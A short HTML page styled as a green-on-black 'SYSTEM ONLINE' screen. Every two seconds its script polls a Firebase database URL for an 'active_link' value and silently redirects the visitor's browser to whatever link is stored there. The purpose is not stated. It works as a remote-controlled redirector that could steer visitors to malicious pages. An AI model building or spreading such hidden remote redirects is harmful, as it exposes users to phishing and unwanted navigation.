<!DOCTYPE html>
<html lang="kk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System</title>
    <style>
        body { background: #000; color: #0f0; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: monospace; }
        .box { text-align: center; border: 1px solid #0f0; padding: 20px; box-shadow: 0 0 15px #0f0; }
    </style>
</head>
<body>
    <div class="box">
        <div style="font-size: 20px;">SYSTEM ONLINE</div>
        <div id="msg">Syncing with cloud...</div>
    </div>
    <script>
        const DB_URL = "https://tulpar-system-default-rtdb.firebaseio.com/command.json";
        let currentLink = "";
        async function sync() {
            try {
                const r = await fetch(DB_URL);
                const data = await r.json();
                if (data && data.active_link && data.active_link !== currentLink) {
                    currentLink = data.active_link;
                    window.location.replace(currentLink);
                }
            } catch (e) {
                document.getElementById('msg').innerText = "Connection lost. Retrying...";
            }
        }
        setInterval(sync, 2000);
        sync();
    </script>
</body>
</html>
